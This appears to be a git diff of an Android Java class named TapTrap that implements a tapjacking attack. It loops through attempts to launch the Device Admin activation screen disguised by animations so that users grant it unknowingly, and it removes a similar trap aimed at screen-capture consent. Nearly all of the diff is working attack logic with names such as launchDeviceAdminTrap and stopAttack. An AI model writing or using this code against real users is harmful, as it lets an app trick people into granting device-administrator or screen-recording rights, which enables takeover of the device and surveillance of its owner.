@@ -7,10 +7,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.res.Resources;
-import android.media.projection.MediaProjectionConfig;
-import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
-import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
@@ -47,13 +44,6 @@ public class TapTrap {
         this.activity = activity;
         this.adminComponent = new ComponentName(activity, AppDeviceAdminReceiver.class);
         this.loopHandler = new Handler(Looper.getMainLooper());
-
-        Log.d("TapTrap", "=== RESOURCE ID DEBUG ===");
-        Log.d("TapTrap", "R.anim.ani_scale2 = " + R.anim.ani_scale2);
-        Log.d("TapTrap", "R.anim.ani_scale2 hex = 0x" + Integer.toHexString(R.anim.ani_scale2));
-        Log.d("TapTrap", "R.anim.ani_scale = " + R.anim.ani_scale);
-        Log.d("TapTrap", "R.anim.ani = " + R.anim.ani);
-        Log.d("TapTrap", "android.R.anim.fade_in = " + android.R.anim.fade_in);
     }
 
 
@@ -63,21 +53,6 @@ public class TapTrap {
                 (DevicePolicyManager) activity.getSystemService(Context.DEVICE_POLICY_SERVICE);
 
         return dpm.isAdminActive(adminComponent);
-    }
-
-    public boolean isScreenCaptureGranted() {
-        return ScreenMirrorService.sResultData != null;
-    }
-
-    public boolean isPermissionGranted(String permission) {
-        int result = ContextCompat.checkSelfPermission(activity, permission);
-        boolean granted = (result == PackageManager.PERMISSION_GRANTED);
-
-        String simpleName = permission.substring(permission.lastIndexOf('.') + 1);
-        Log.d("tapTrap", "Permission " + simpleName + ": " +
-                (granted ? "✅ GRANTED" : "❌ DENIED"));
-
-        return granted;
     }
 
 
@@ -106,48 +81,28 @@ public class TapTrap {
             return;
         }
 
-        boolean adminGranted = isDeviceAdminActive();
-        boolean screenGranted = isScreenCaptureGranted();
-
-        Log.d("TapTrap", "🔄 Loop - Admin: " + adminGranted + ", Screen: " + screenGranted);
-
-        // Success! Check BOTH permissions
-        if (adminGranted && screenGranted) {
-            Log.d("TapTrap", "✅ All permissions granted!");
+        // Success!
+        if (isDeviceAdminActive()) {
             stopAttack();
             return;
         }
 
         // Too many attempts
         if (attemptCount >= MAX_ATTEMPTS) {
-            Log.d("TapTrap", "❌ Max attempts reached");
             stopAttack();
             return;
         }
 
+        // Launch next attack
         attemptCount++;
-        Log.d("TapTrap", "🔄 Attempt #" + attemptCount);
+        launchDeviceAdminTrap();
 
-        // Try ONE permission at a time
-        if (!adminGranted) {
-            Log.d("TapTrap", "🎯 Trying Device Admin...");
-            launchDeviceAdminTrap();
-        }
-        else if (!screenGranted) {
-            Log.d("TapTrap", "🎯 Trying Screen Capture...");
-            launchScreenCaptureTrap();
-        }
-
-        // Schedule the NEXT loop check AFTER the attack window
-        // This should be OUTSIDE the current attack methods
-        scheduleNextLoop();
-    }
-
-    private void scheduleNextLoop() {
+        // Check result and schedule next
         loopHandler.postDelayed(() -> {
-            // Check again after attack window
-            runAttackLoop();
-        }, ATTACK_DURATION + LOOP_DELAY);
+            if (!isDeviceAdminActive()) {
+                loopHandler.postDelayed(this::runAttackLoop, LOOP_DELAY);
+            }
+        }, ATTACK_DURATION + 500);
     }
 
     private void launchDeviceAdminTrap() {
@@ -167,51 +122,6 @@ public class TapTrap {
                 activity.startActivity(returnIntent);
             }
         }, ATTACK_DURATION);
-    }
-
-
-    // acreen capture intent
-    public interface ScreenCaptureCallback {
-        void onLaunchScreenCapture(Intent intent, int enterAnimResId);
-    }
-
-    private ScreenCaptureCallback screenCaptureCallback;
-
-    public void setScreenCaptureCallback(ScreenCaptureCallback callback) {
-        this.screenCaptureCallback = callback;
-    }
-
-    // Modify your launchScreenCaptureTrap method
-    public void launchScreenCaptureTrap() {
-        // Create intent HERE in TapTrap
-        MediaProjectionManager mpm = (MediaProjectionManager)
-                activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-
-        Intent intent;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            intent = mpm.createScreenCaptureIntent(
-                    MediaProjectionConfig.createConfigForDefaultDisplay()
-            );
-        } else {
-            intent = mpm.createScreenCaptureIntent();
-        }
-
-        // Pass intent back to Compose
-        if (screenCaptureCallback != null) {
-            screenCaptureCallback.onLaunchScreenCapture(intent,R.anim.ani_scale);
-        }
-
-
-
-        // Apply animation
-        //activity.overridePendingTransition(R.anim.ani_scale2, 1);
-
-        // Escape after 2800ms
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            Intent returnIntent = new Intent(activity, activity.getClass());
-            returnIntent.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
-            activity.startActivity(returnIntent);
-        }, 2800);
     }
 
 
@@ -279,7 +189,16 @@ public class TapTrap {
 
 
 
+    public boolean isPermissionGranted(String permission) {
+        int result = ContextCompat.checkSelfPermission(activity, permission);
+        boolean granted = (result == PackageManager.PERMISSION_GRANTED);
 
+        String simpleName = permission.substring(permission.lastIndexOf('.') + 1);
+        Log.d("tapTrap", "Permission " + simpleName + ": " +
+                (granted ? "✅ GRANTED" : "❌ DENIED"));
+
+        return granted;
+    }
     public void testInvisible2() {
         try {
             Animation anim = AnimationUtils.loadAnimation(activity, R.anim.ani);
